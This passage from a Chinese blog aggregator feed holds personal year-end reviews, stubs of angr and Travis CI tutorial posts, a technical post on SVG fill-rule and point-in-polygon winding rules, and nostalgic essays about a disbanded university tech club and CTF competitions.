title="心跳"></p><p>但是，因为遇到了一件让我很想不明白的问题，所以那天平均下来，心情并没有非常好。中午在肯德基的时候，一群小孩子坐在那个长桌上，我就去桌角坐了下来，然后来了一个不到50的大叔，带着牛仔帽，穿着牛仔裤，一股很西部的感觉，看起来像是一个领队或者是导游。一开始他们的交谈没有什么特殊，无非是吃啥不是啥。然后开始问坐在我旁边的一个十岁左右的男孩子</p><p>— 你是家里最小的么</p><p>— 是最小的 还有俩姐姐 ，男孩回答</p><p>大叔又问</p><p>— 她俩也是sas的么</p><p>然后我就很困惑 没有听懂sas这个缩写的意思，也寻思这啥家庭啊，能在上海生仨。</p><p>男孩回答 不是，是在Boston，某某某某，一个四个字缩写的地方</p><p>然后我就偷偷掏出手机查了一下，sas 是 Shanghai American School</p><p>后来接着听，几个孩子的父母大多都是已经移民的中国人。</p><p>为什么说大多呢？因为后来的对话英文越来越多，很多俚语我就越来越听不懂了。</p><p>再怎么努力，我也不可能成为这些快乐的小孩子的样子了，我自己本身不能拥有他们的资源，可能让下一代拥有都不现实。这，就是欢乐谷的中产阶级陷阱。</p><blockquote><p>“很多大学生不敢想，一毕业月薪就能过万？”</p></blockquote><p>这是我今年听过太多次太多次的句子了。很多人觉得互联网赚钱多赚钱快，但是基层的互联网从业者却是一条永远不可能走向中产阶级的路。因为互联网正是在打破了信息不对称和信息垄断的同时，构建起了新的阶级壁垒，越努力写代码，这个壁垒，越可能会越牢固。</p><p>周日在赵神家那边，赵神喝星巴克，我开玩笑说这是中产阶级陷阱，要警惕，就说到了19年的年度总结，和有没有实现去年的计划，当时我们俩就各自掏♂出来对了一下，就体现了我低起点高要求的好处了。</p><blockquote><p>穷人通过节食碳水的方法很难减肥，因为他们没有其他如碳水这么廉价途径来获取快感了</p></blockquote><p>这句话是我今年看到的，印象很深的一句。《中国式家长》里，马术的框外话就是“中产阶级陷阱”。与钱一样，多少人背负了不属于自己阶级的负担啊。</p><p>所以我啥时候有时间去滑个雪？🕳️</p><h2>生孩子与不生孩子 与后来者们</h2><p>最近看的电影，无非两种 —— 忽悠你生孩子的，忽悠你别生孩子的。其实细细总结，也因为毕竟是二分嘛，看过的所有的电影都可以归为这两类。<em>The Art of Racing in the Rain</em>，<em>Sunny</em>，<em>Innocent Witness</em>，<em>Kim Ji-young,Born 1982</em>，<em>寄生虫</em>，<em>Joker</em>，甚至说四个字小<del>哥哥</del>弟弟的 <em>Better Days</em>《少年的你》，我觉得都是蛮成功的劝退生孩子的典范。</p><p>自己不生归不生，但是后来者可敬是真的可敬的。我觉得鹤洋活成了我当年理想的那个样子，很敬佩他能够想明白自己需要的是什么，并且知道怎么样去得到。</p><p>世界上太多不知道，又有太多不值得，知道又值得的东西，找到一件都是应该被珍视的。倘若珍视的东西被人给打碎了一次，以后就再也找不到这样的值得了。</p><h2>求职与打工</h2><p>这个更加和往年一样，无出意料，今年是找工作，最竞争最激烈的一年。那么到底是什么东西，能让一个东西持续增长而既不收敛又不混沌呢？</p><p>秋招找工作其实蛮不顺利的。虽然当时我和很多人表达我的担心和顾虑，但是大家都劝我说我不会饿死，至少可以去写个公众号pp图什么，还能 php 写个微信后台一把梭。我担心的不是找不到工作，也不是找不到好工作，而是不明白什么是好工作。纸上得来终觉浅，如果我不去生产车间流水线亲自实训试一下，我怎么知道你这个挖掘机技术有没有我家乡的好？</p><p>很大程度上这个也来自于我对当时选大学失误的反思吧。</p><p>所以，这个遗憾其实来自于，上一年的一个计划 “暑假还来腾讯”。。。。</p><p>于是散装实习生的暑期实习就还是腾讯。后话现在说起来，我是有点后悔的，我更想去的是 bytedance，华为，海康威视这种，这种我在价值观或者是产品上不喜欢的公司。因为只有进入了其中，你才能不被层层的言语评论蒙蔽，去真实体会到他们是什么样子的，才能在做判断的时候没有偏差，更全面的考虑一些事情。散装腾讯稳当是稳当了，但是免不了变得鹅头鹅脑。</p><p>总体我自己感受下来，19 年确实艰难，大家的钱都花的差不多了，毕业生也越来越精了，知道一年有几个月，知道 base，自己用乘法一算，再百度一下扣税就能算出薪水，也越来越难画饼了。</p><h2>check N plan</h2><p>在《不分黑白的一年》中，</p><ol><li>[✓✓]在腾讯摸好鱼鱼，争取暑假还能够去 （不但摸了鱼鱼，还经常拿食堂的小鱼干去茘香公园喂猫</li><li>[✓]达成和rex在深圳吃夜宵的愿望 （甚至加上三三达成三p</li><li>[✓]在一个没有前辈带我的环境里，成长一段时间 （独自摸鱼</li><li>[✗]专心带好一个晚辈，像当年rex对我一样 （没有培养出一个小 Rex，倒是把纸飞机搞倒闭了</li><li>[✗]去一趟日本 （delay</li><li>[✗✗]成为一个优秀的开发者 （这个改成 成为一个<strong>优秀的钓鱼选手</strong>算了</li></ol><p>因为目标确实比较宽泛哎，所以说去除 delay 项目，还是比较满意这一年对于 plan 的实现的</p><ol><li>多游几次泳</li><li>多吃几次烤肉</li><li>多放几次风筝</li><li>尽量多去几个 destination list 的地方，老了就没机会了</li><li>带好后辈们，因为觉得他们有点失独老人的味道，更不想让他们变成孤儿了</li><li>成为一个优秀的钓鱼选手</li></ol><p>see U 2019</p><p>下次再见，不知何时</p>]]></content>
        <author>
            <name><![CDATA[善良单纯的板の窝]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/2019/12/31/my-2019/</id>
        <title><![CDATA[我的 2019 总结]]></title>
        <updated>2019-12-31T04:00:56+08:00</updated>
        <link href="http://blog.qrzbing.cn/2019/12/31/my-2019/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/2019/12/31/my-2019/"><![CDATA[<p>学习一下赵神做一下年终总结，虽然自己很菜就是啦。</p>]]></content>
        <author>
            <name><![CDATA[QRZ’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/2019/10/04/angr-newhand-3/</id>
        <title><![CDATA[angr 入门（三）]]></title>
        <updated>2019-12-31T04:00:56+08:00</updated>
        <link href="http://blog.qrzbing.cn/2019/10/04/angr-newhand-3/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/2019/10/04/angr-newhand-3/"><![CDATA[<p>本篇主要记录了新手使用 angr 对内存和寄存器操作的记录。题目分析顺序参考了这篇文章：<a href="https://xz.aliyun.com/t/4052" target="_blank" rel="noopener">深入浅出angr（三）</a></p>]]></content>
        <author>
            <name><![CDATA[QRZ’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/2019/10/01/from-0-to-Travis/</id>
        <title><![CDATA[使用 Travis CI 自动部署 Hexo 博客]]></title>
        <updated>2019-12-31T04:00:56+08:00</updated>
        <link href="http://blog.qrzbing.cn/2019/10/01/from-0-to-Travis/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/2019/10/01/from-0-to-Travis/"><![CDATA[<p>最近一直在 Manjaro 和 Windows 之间切换，现在学习都已经在 Manjaro 上进行了，但是博客还在 Windows 上。虽然迁移过来并不难，但还是太麻烦了。另外写博客还要开电脑，的确有点麻烦。作为一个懒人当然是动动手自动推送最好，我就想到了用 <a href="https://travis-ci.org/" target="_blank" rel="noopener">Travis CI</a> 来自动部署博客。</p>]]></content>
        <author>
            <name><![CDATA[QRZ’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/2019/09/30/angr-newhand-2/</id>
        <title><![CDATA[angr 入门（二）]]></title>
        <updated>2019-12-31T04:00:56+08:00</updated>
        <link href="http://blog.qrzbing.cn/2019/09/30/angr-newhand-2/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/2019/09/30/angr-newhand-2/"><![CDATA[<p>这里更进一步地学习了 angr 的一些知识点。</p>]]></content>
        <author>
            <name><![CDATA[QRZ’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/2019/09/15/angr-newhand-1/</id>
        <title><![CDATA[angr 入门（一）]]></title>
        <updated>2019-12-31T04:00:56+08:00</updated>
        <link href="http://blog.qrzbing.cn/2019/09/15/angr-newhand-1/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/2019/09/15/angr-newhand-1/"><![CDATA[<p>让我们从官方文档走起。</p>]]></content>
        <author>
            <name><![CDATA[QRZ’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/a-computational-geometry-problem-from-the-ui-component-library.html</id>
        <title><![CDATA[从前端组件库引出的计算几何问题]]></title>
        <updated>2019-11-30T15:18:00+08:00</updated>
        <link href="https://blog.rexskz.info/a-computational-geometry-problem-from-the-ui-component-library.html"/>
        <content type="text/html" src="https://blog.rexskz.info/a-computational-geometry-problem-from-the-ui-component-library.html"><![CDATA[<p>是的，又是那个组件库。由于脚手架搭的比较好，大家开发的效率超出了预期。然而总有些不顺利的事情出现，于是就有了这次要说的事情。</p><h1>一个容易解决的问题</h1><p>我们的 <code>&lt;Icon&gt;</code> 组件跟 Ant design 比较类似，底层用的是 SVG，这样可以通过按需引入以减小空间。由于 SVG 是设计师用 Illustrator 画的，里面必定会带有各种无关紧要的信息，因此同事在构建脚本中用 <code>svgo</code> 去掉了几乎所有用不到的数据。然而，我们发现不能去掉 <code>fill</code> 属性（通常 SVG 图标内部不能带有具体颜色的 <code>fill</code>，而是要指定 <code>fill: currentColor</code> 来保证页面可以为其设置“字体颜色”），否则有些图标会变成一个黑色方块。</p><p>经过审查元素我发现，所有变成了黑色方块的图标，都带有一个 <code>&lt;path d=&quot;M0 0H24V24H0Z&quot; /&gt;</code> 的标签，这条路径很明显是一个占满了整张图像的正方形（我们的图标都是 24x24 的），似乎是 <code>svgo</code> 为了减少几个字节，将一个 <code>&lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;24&quot; height=&quot;24&quot; /&gt;</code> 转换而成的。当我们去掉了 <code>fill</code> 之后，默认的 <code>fill</code> 就是 <code>#000000</code>，自然就成了黑色方框。</p><p>我们去找了设计师，发现设计师为了方便设计，为每个图标都加了一个 24x24 的白色方框，将其删除就可以了。</p><h1>盲生你发现了华点</h1><p>虽然问题解决了，但一个疑问随之而来：既然设计师给每个图标都加了方框，为什么只有一部分图标会出问题呢？于是我又看向了之前那些没有问题的 SVG，发现 <code>&lt;path&gt;</code> 里面的路径是 <code>M0 0H24V24H0M0 0H24V24H0M0 0H24V24H0M0 0H24V24H0Z</code>，如果说之前那条路径是从左上角开始顺时针画了一个正方形，那这条路径就是额外又绕了三圈。这可能是 <code>svgo</code> 转换的问题，暂且不谈，只是想知道，为什么多绕了三圈之后反而没有问题了呢？</p><h1>两种不同的填充规则</h1><p>经过几次控制变量法之后，我们发现是一个叫 <code>fill-rule</code> 的属性在作怪。去 MDN 上面搜了一下，发现 <a href="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Attribute/fill-rule">中文版本</a> 落后英文版本实在太远，于是顺手帮忙完整的翻译了一下。简单来说（为了方便起见，下文中所有的“线段”、“路径段”可能是直的，也可能是弯的，“多边形”则代指由任意多的“路径段”组成的一个封闭图形）：</p><blockquote><p>如何判断一个路径组成的多边形的内部区域，从而给它上色，对于一个简单的、没有交错的路径来说，是很显然的；然而，对于一个更为复杂的路径，比如一条与自身相交的路径，或者是这条路径上的其中一段将另一段包围着，要解释什么是“内部”，就不再这么显然了。</p></blockquote><p>很显然我们那个绕了四圈的路径，就是绘制了一个复杂多边形。</p><p>两种绘制模式分别是 <code>non-zero</code> 和 <code>evenodd</code>，其中 <code>non-zero</code> 的原理是：</p><blockquote><p>从该点向任意方向的无限远处绘制射线，然后检测形状与射线相交的位置。从 <code>0</code> 开始统计，路径上每一条从左到右（顺时针）跨过射线的线段都会让结果加 <code>1</code>，每条从右向左（逆时针）跨过射线的线段都会让结果减 <code>1</code>。当统计结束后，如果结果为 <code>0</code>，则点在外部；如果结果不为 <code>0</code>，则点在内部。</p></blockquote><p>而 <code>evenodd</code> 的原理则是：</p><blockquote><p>从该点向任意方向无限远处绘制射线，并统计这个形状所有的路径段中，与射线相交的路径段的数量。如果有奇数个路径段与射线相交，则点在内部；如果有偶数个，则点在外部。</p></blockquote><p>设计师给的 SVG 的 <code>fill-rule</code> 是 <code>evenodd</code>，如果我从 <code>(12, 12)</code>（图标正中心）往正右方引射线，那么对于有问题的 SVG，射线只会与 <code>1</code>（奇数）条边相交；对于没问题的 SVG，射线会与 <code>4</code>（偶数）条边相交。因此前者的中心区域会被填充，而后者的中心区域不会。</p><p>那么该取哪个点、往哪个方向引射线呢？万一射线刚好穿过某个顶点，或者跟某条边重合了呢？鉴于 MDN 上面没有明确的结论，我又去翻 <a href="https://www.w3.org/TR/SVG/painting.html#WindingRule">W3C</a>，发现了这个：</p><blockquote><p>The above descriptions do not specify what to do if a path segment coincides with or is tangent to the ray. Since any ray will do, one may simply choose a different ray that does not have such problem intersections.</p></blockquote><p>通俗来讲就是：如果发生了路径段与射线相切（路径段可能是条曲线）或重合的情况，就换一条射线，总有射线不会出现这种情况。</p><h1>计算几何中的解法</h1><p>记得高中竞赛时期曾经做过一些计算几何相关的东西，其中一类算法就是判断一个点在多边形内还是外（还是边上），记得当时我比较熟悉的做法是：</p><blockquote><p>从某一顶点开始沿着边行走，按顺序枚举多边形上的每个顶点，从该点往这些顶点依次引射线，将所有“前一条射线与当前射线的夹角”（逆时针为正，顺时针为负）求和，如果是 <code>0</code> 则表示点在多边形外部，不为 <code>0</code>（可能是 [math]2 \pi[/math] 或 [math]-2 \pi[/math] 的整数倍）则表示点在多边形内部。</p></blockquote><p>这种做法只需要一个循环和一个夹角公式（可以由向量的点积公式得出），不需要复杂的判断，也无需考虑边是直线还是曲线，比之前的两种算法要简单的多，为什么 SVG 没有用这样的方法呢？我认为，可能是因为无法避免用到反三角函数（acos）和除法，对精度要求较高，运算速度也较慢。之前的两种做法无论是判断顺逆时针还是判断相交，都可以通过一些方式避免三角函数和除法，因此速度会更快一些。</p><p>还有一些其它算法，<a href="https://blog.csdn.net/WilliamSun0122/article/details/77994526">这篇文章</a> 已经写的很好了，里面还附了代码，这儿就不再重复了。</p><h1>番外：OpenGL 中的 Winding Rules / Numbers</h1><p>在查资料的过程中，我发现 OpenGL 对于 <code>non-zero</code> 的支持更加完善，<a href="http://www.songho.ca/opengl/gl_tessellation.html">这篇文章</a> 的最后一小节举了几个例子，分别是：</p><pre><code class="lang-text">GLU_TESS_WINDING_ODD：如果结果是奇数则被填充，这是 OpenGL 的默认配置
GLU_TESS_WINDING_NONZERO：跟 SVG 的 non-zero 相同
GLU_TESS_WINDING_POSITIVE：如果结果是正数则被填充
GLU_TESS_WINDING_NEGATIVE：如果结果是负数则被填充
GLU_TESS_WINDING_ABS_GEQ_TWO：如果结果大于等于 2 则被填充</code></pre><p>然而，想要在 OpenGL 中实现 <code>evenodd</code>，需要花一点功夫：先用 <code>glStencilOpSeparate</code> 先设置 Buffer，将所有 <code>GL_FRONT</code>（顺时针元素）所在区域加一，<code>GL_BACK</code>（逆时针元素）所在区域减一，然后使用 <code>glStencilFunc</code> 告诉 OpenGL 只绘制 Buffer 中为 <code>1</code> 的区域，也就变相的达到了 <code>evenodd</code> 的效果。</p><p>这并不是一个完美的解决方案，首先这只适用于多个闭合子路径的情况，不适合单一的、边与边相交的路径；此外必须指定路径的顺时针与逆时针。（由于我对 OpenGL 不熟悉，这一自然段不保证正确性，如果有错还请大佬们指出。）</p><p>我找到了一段使用了这个方法的 <a href="https://github.com/rougier/python-opengl/blob/master/10-polygons.rst#odd-even-fill-rule">Python 示例</a>，里面的图形是这个：</p><p><img src="https://raw.githubusercontent.com/rougier/python-opengl/master/images/chapter-10/winding.png" alt="Odd-even fill rule using the stencil buffer" title="Odd-even fill rule using the stencil buffer"></p><p>绘制的代码在 <a href="https://github.com/rougier/python-opengl/blob/69fb9bcaa297a253c891142bb661ac73c9f15fe5/code/chapter-10/winding.py">这里</a>，可以在最下方看到作者通过变量 <code>P</code> 指定了每个顶点的坐标，变量 <code>I</code> 指定了三个正方形的顶点顺序。如果把第二行的顺时针改为逆时针，就无法得到上面的图像了，取而代之的是一个完整的灰色正方形。</p><h1>参考资料</h1><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Attribute/fill-rule">fill-rule - SVG | MDN</a></li><li><a href="https://www.w3.org/TR/SVG/painting.html#WindingRule">Painting: Filling, Stroking and Marker Symbols — SVG 2</a></li><li><a href="https://blog.csdn.net/WilliamSun0122/article/details/77994526">详谈判断点在多边形内的七种方法（最全面） hdu1756 hrbust1429 为例 - WilliamSun0122的博客 - CSDN博客</a></li><li><a href="http://www.songho.ca/opengl/gl_tessellation.html">OpenGL Tessellation</a></li><li><a href="https://github.com/rougier/python-opengl/blob/master/10-polygons.rst#odd-even-fill-rule">python-opengl/10-polygons.rst at master · rougier/python-opengl</a></li></ul>]]></content>
        <author>
            <name><![CDATA[R·ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://yuwenjie.cc/2019-iwanttofly.html</id>
        <title><![CDATA[iwanttofly]]></title>
        <updated>2019-10-24T16:45:18+08:00</updated>
        <link href="https://yuwenjie.cc/2019-iwanttofly.html"/>
        <content type="text/html" src="https://yuwenjie.cc/2019-iwanttofly.html"><![CDATA[<p>这篇文章我肚子里想了好多好多的标题，从最早的《从 mynuaa 到 nuaa》，到《从校服到版对婚礼》，到很多很多很多很多，听起来非常有仪式感的名字。但是每次都感觉，我没有办法驾驭那么高的标题，倒闭文章如果写的不好，会成为很多人心里永远的结，而且这个结真的真的是再也没有机会去纠正了。</p><p>————写在前边</p><blockquote><p>--“iwanttofly，全部小写”<br>--“to是2还是T, O啊”<br>--“to”<br>--“....这是不是和没说一样”<br>--“俩字母的那个”</p></blockquote><p>这是我和 rex 比较“早（you）期（chi）”的一段对话。</p><p>不知道从什么时候开始，<code>iwanttofly</code>就是办公室的 WIFI 密码，从最早的单频<code>ZFJ-office</code>，到后来有了双频，<code>ZFJ-5G</code>，密码一直都是这个。其实 rex 的那段对话之后，没有翻译给我这句话是什么意思，记得他当时是在打太鼓还是和新生工作组的小（nv）朋（hai）友（zi）聊来着。当时我自己琢磨，这个密码还蛮有两航特色的咯，我想上天，很主旋律。</p><p>我这么想是因为，我没有去2016年纸飞机的那一场新生晚会。</p><p>其实我去了，那次在三食堂的三楼，被一个小姐姐以已经坐满了为理由，把我赶回去了。</p><p>更令人生气的是，那天晚上黑灯瞎火，我也没认出来他是谁（现在严重怀疑就是林青2333。</p><p>所以，在很久之后的蛋蛋晚会，我才知道了这个小slogan的含义——</p><p>这里是离梦想最近的地方呀。</p><p>在之后的很多很多年里，我每天晚上在办公室里，对着来修电脑的大小朋友们，说了一次又一次的<code>iwanttofly</code>，大部分人其实也没有问我当时问的那个问题；当然，可能更也没有去想，这句话到底是什么意思，这个办公室里这群疯狂的人，到底为什么老是想着上天？</p><p>那年蛋蛋晚会的时候，开会讨论怎么宣传，我提了一个修改自己宿舍里的WIFI名和在教室布置AP/手机热点的方法，可能碍于当时只是一个小干事，身份卑微，可怜巴巴的没有人采用这个中二的想法，只能自己改成了这个，现在还存在记事本的第二行——大学的新开的一个记事本。</p><p><img src="https://cdn.jsdelivr.net/gh/seiry/img-outer@img//2016.1225-wifi.png" alt="蛋蛋wifi" title="蛋蛋wifi"></p><p>那年的蛋蛋晚会，rex说不想用斗鱼的直播，要用自己的技术，那时候自己（rex自己，我看着）编译nginx，看<code>flv.js</code>，看<code>hls.js</code>，夹杂着<code>diygod</code>的生平故事，后来顶着南航校园网无敌的qos策略和网络质量，顶着沈学姐本部跑来跑去的保密协议申请，勉强实现了个位数并发的推流直播。</p><p>结束之后，收拾东西，从地上揭起网线的时候，我明白了 rex 对于自己做直播的执念——</p><p>我们的梦想，终究是只属于我们的。</p><p>当时b站的直播还没有做大，斗鱼也远远没有被腾讯纳入版图，对于技术的执念，使我们依然没有选择妥协，宁可在南航这片稍显贫瘠的土地上，去带着镣铐舞蹈。</p><p>下一次的直播加上了七牛的cdn，那年的七牛，也不用太实名认证，还可以用二级域名，流畅度终于还是能满足老人们看一眼的心愿。十分惭愧的是，rex走了之后，我没有再用那一套系统，上一年达叔找我帮我直播16院毕业晚会的时候，我也妥协选择了b站的现成轮子。</p><p>同样的obs，同样的16级毕业晚会，甚至是同一台电视台的摄像机，同样的送走一帮人，只是这次走的是达叔耗子哥哥和邓理juju，上次离开的是大白rex。惭愧的是我，有一些东西没有能够继承下来。</p><p>同样的那个舞台的位置，也是我做部长的成员大会的地方，欠款￥5000的地方。那天大家都穿的正装，女孩子们都花了口红，那次小菜妮的口红真的画的很拙略，宋梦娜给我系的领带也很拙略，我和王娟的自拍照片也很拙略。但是丝毫不影响，之后大家走出的精彩的路，和那次书记读错纸飞机的名字。</p><p>不知道还有多少人记得那次蛋蛋晚会的快闪。叫做快闪，可能也不是为了被人永远的记住，只是参与者永远的记住了吧。那天新的站衫还有没有到，我第一次穿的是老人们的上一年的站衫，而现在，我已经有那么多那么多件的站衫了，那是永远穿出去不会丢人的东西。</p><p>不过站衫的材质，随着世风的日下，变得越来越不好了，也很痛心的看到，小孩子们买的越来越少；也很难受让他们去买，以此来给组织提供经济支持。我以前有个蛮神奇合理的想法——一个人，最多只能拥有三件纸飞机的站衫，后来觉得不妥，应该是三套，毕竟春夏秋冬；又觉得还是不妥，rex就有四年的；到了现在四年的也不妥了，因为我还往前嫖了好多年的，现在穿着六周年的那件t恤，自豪感十足，身份和地位的象征。</p><p>我之前说过，一个学校好，不代表在学校里的你会好——因为我们通常说的名校，更多的指的是他的上限。其实我是不知道，正式发公告的第二天是学校的校庆——又有多少人记得呢。“死在黎明的前夜”，乍一听还是个满浪漫的说法的。依附于这样的一个日子，大家在追思纸飞机的时候，就有一个标记了，这样南航就变成了纸飞机的粽子，纸飞机一直是南航的屈原。<code>mynuaa</code>是纸飞机的官方英文名字，但是不知道啥时候开始，差不多是我这一届的小朋友，开始叫更多地写成<code>nuaazfj</code>，两个英文名都有很多好玩的谐音梗，“买南航”“卖南航”“马原南航”，“nuaa政府军”“nuaa造反军”“nuaa执法局”。我是更喜欢<code>mynuaa</code>一点——我在意的区别其实my是nuaa的定语，nuaa是zfj的定语。zfj可能只有一个，但是my，有千千万万个，千千万万个my背后，是千千万万个善良单纯的梦想。有人教导我们，在大的利益面前，要妥协，要退让，要牺牲小的利益，牺牲小我，因此<code>nuaa</code>如此的洪亮，每年吸引了多少善男信女；但是吸引他们的是南航的头部，头部也正需要更多人的加入来垫起脚跟。纸飞机曾经很让我以之为傲的就是，技术部的部长都好nb啊，bat可以各种拉满，这对年级小的时候的我，充满了无穷的偶像吸引。虽然每个人的观察都是有偏差的，几乎每个人都找得到工作，每个人都饿不死，每个人也都因为围城而惦记着进进出出，但是bat三个字母，代表真的是优秀。他们和我听说的那些读书学霸并不一样，高数大物无限补考重修，教务处内网游泳片叶不沾，走南闯北无所不能，赚钱养家经济独立，每一个特质我都好喜欢，当时我应该算是“悄悄地”下定决心吧，也要成为像他们一样的人，尽管有一些东西可能是坏的。在我看来，他们在选择就业时的从容，选择余地的开阔，才是大学带来的最有用的东西——当然这最有用的东西，对于一个学校也只是一个数字，理应如此。所以我也看来，他们是真正代表这个学校头部的那些人。</p><p>有一个学长，开玩笑说，“等谁以后nb了，回学校，就问问校长，纸飞机现在在干啥”。真正的头部，永远不会在当下去想尽办法得到别人的点头认同——ta是隽永而深远的。</p><p>所以，当<code>mynuaa</code>变成了<code>nuaa</code>，失去的是它的<code>prefix</code>，它的头部，也是它曾经鲜明的一面旗帜。</p><p>今年又是一年招新已经结束了，小朋友们多多少少去了各种各样学生组织学生社团，或是背着南航的旗帜在工作，或是背着自己的爱好在工作，他们口中的“我航”，什么时候回变成“你航”呢？</p><p><img src="https://cdn.jsdelivr.net/gh/seiry/img-outer@img//bandui.png" alt="版对" title="版对"></p><p>虽然我现在也觉得，学生组织不是个找对象的最佳实践，但是对于大部分写代码的男孩子来说，纸飞机真的曾经是个神奇的地方。有共同的追求和信仰，共同激励过困难，这是产生火花的重要因素。曾经版主之间的火花，就是尤其强烈的。多少人曾经做过校服到礼服的华丽美梦呀，又有多少人能实现呢？大学的互联网藩篱被移动互联网推到，大家加入了更大的池子，那个有趣的灵魂，也就越来越难和你在无规则运动的时候碰到了，的确也只能惋惜了。</p><p>清补凉的老板，一直是纸飞机的吉祥物，或者说是技术部的吉祥物。他和曾经的后街各家店一起，是纸飞机共同的回忆。但是豆花店换了一个又一个的老板，煎饺也一次又一次的变味，没有人知道南航共同的胃还能坚持多久。但是这不影响涉世未深的新人——他们的第一口，就是这样的；他们的第一眼，正新鸡排也就是10块钱的；眼里的学生会，也就是四个部门的；眼里的社联，也就是社团管理部；眼里的团委，也就是红星闪闪，引领前进方向的排头马。</p><p>写的太乱太乱了，因为断断续续写下来，心情也变过很多次，主题也变过很多次，我也不知道，对于解散这件事情，应该隐晦？应该直白？应该辞藻华丽？太多太多的答案，11年的成长岁月里，真的真的不足以解答；但是闪闪夺目的11年岁月，又是再华丽的词汇句式不能表达的。</p><p>但是至少有一点，我可以坚信的是，纸飞机在这片土地上，的的确确不存在了；因此我们就坚信，纸飞机已经飞到了我们的梦想地方，在那里等我们。</p><p>四年前，纸飞机告诉我们，这里是离梦想最近地方；现在纸飞机告诉你，她很好，她在那里等着你，你一定要坚持走下去呀！</p>]]></content>
        <author>
            <name><![CDATA[善良单纯的板の窝]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://yuwenjie.cc/2019-cp.html</id>
        <title><![CDATA[创业者与继承者]]></title>
        <updated>2019-09-19T01:42:51+08:00</updated>
        <link href="https://yuwenjie.cc/2019-cp.html"/>
        <content type="text/html" src="https://yuwenjie.cc/2019-cp.html"><![CDATA[<blockquote><p>考多少分，就上什么样的大学，住什么样的宿舍<br> ——写在前边</p></blockquote><p>陆师傅早上发了一篇大学的结束，一如既往地细腻的文字，但是这是第一次感觉陆师傅这样的难受，和我那一次一样难受。</p><p>结束总对应着一个开始。我的开始始于一对神仙cp——白师傅和Rex。</p><p>整三年前的军训的时候，我在艺术中心楼下第一次见到了等我Rex，Rex第一次见到了放鸽子的我。那一年的纸飞机，8岁；我，19岁；距离我离开艺术中心，还有三年。Rex在学校的“最后”一年，大多数都白天中的大多数时间，我都待在他身边。那是一段牢固地打基础的时光，也是现在每次面试我都会讲的故事。</p><p>大学的第一个春天，4月份的百家湖，我第一次和白师傅组队打那时候还不为女孩子们所知的CTF，“出道即是巅峰”也成为了我悬在头顶摆脱不掉的那把剑。我拿到了第一笔奖金，为数不多的冠军中的第一个。其实在那场比赛中，我也已经见过了后来的人生中对我也十分重要的一些人，梅子酒，徐院长，和我不解之缘的浙江警察s，当时还叫解理工的兵哥哥s，赛宁，也包括校内的罗师傅日天师傅等等等等——只不过我们当时只是路人，后来的后来我们坐在一起回忆往事的时候，才发现初见是这里。那年xctf，1岁；白师傅打ctf，三年；距离我耻辱退役，还有两年。</p><p>写到这，高铁刚好开始开了，小哥哥乘务员也检查完了我的吊诡学生证。</p><p>切题应景哎，故事写到这，大学生活也开车了。</p><p>那个时候学校的名字，还叫南京航空航天大学。和神仙cp的轨迹极其吻合——在高数挂科重修的边界跳舞。和他俩不一样的是，省实验和泰安一中，我只是来自一个小县城的小高中，我嗑的cp并不和我活在一个起跑线。所以故事的开始也就注定了，这要么是一篇屌丝逆袭的文章，要么是一篇淹没在人群中碌碌的一段旅途。而且旅途还没开始，我已经用他们的轨道两次对比了自己。</p><p>他们两个是我至今也走不出的影子，我也不知道我这样做他们是怎么想的，这就是榜样的力量吧。</p><p>回忆大一大二大三，最先进入人眼前的是精彩的一幕一幕，让人觉得这三年的整体是光彩异常的。但是你尝试从中汲取无数个亮点的时候，就会发现两颗亮点之间，是无边无际的黢黑深空。一颗星再亮，一个星座再恢宏，摆脱不掉的是，99%的地方无法被照亮。</p><p>在赛宁的时候，邓巨巨决定要走的时候，我也毅然决然地也走了。当时更多的考虑的不是事情的对与否，而是事情是否应该做，作为一个小孩子我还没有能力也不敢于考虑前者。杭州铁三的时候，那是我第一次背南航的旗去别的地方，也是第一次没有白师傅的一场，也拿到了一笔令我欣喜的奖金，也把键盘丢在了浙警，那是我第一次到浙警。西电国赛的时候，然叔问我当时为什么不坚决，退赛，我说我怕学校不开心，然叔“退赛是正确的，学校这边有我”，那一次我坚决的站在了杭电一边，开撕从领导到校长。软件杯的时候在会展中心，我问班长和甲鱼，这次比赛重要么，你们要读研么，也忘了当时他们骗没骗我来着，那次大家自拍，女装，紧张，但是是好开心的一次啊。领航杯还是什么的名字我都忘了，我选择了直接电话里骂他一个狗血淋头，调头退赛，发那件马甲我倒是喜欢冬天拿出来穿。清华国赛的时候，我在搜狐上班，他们就在街对面比赛，当时好想上场啊，但是自己又太菜了，当时也就没有争取。那天我偷偷跑到清华，在场馆外也算是陪着他们了，也是一阵心酸。作为整个中关村差不多文凭最低的人，那是一段艰苦的日子，每天要面对北大和清华的各路神仙master，并不因为他们的方向多么高端，而且人家从宿舍步行十分钟就能来上班了，我却要地铁两小时，他们可能不但起跑线和三本南航不一样，轨道都是朝上修的。</p><p>那是我最想读研读博的一段时光。</p><p>大三开始，神仙cp都已经远离了学校，撒手留我在这魔幻人间。失去了目标不能再跟车行驶，让我难以找到方向。但是他们其实又没有走，只是在你前方的50个出口驶出了高速，给我留下了一个远远的模糊目标——或许你应该再拿个奖学金？或许你应该被做成灯牌挂载路边？  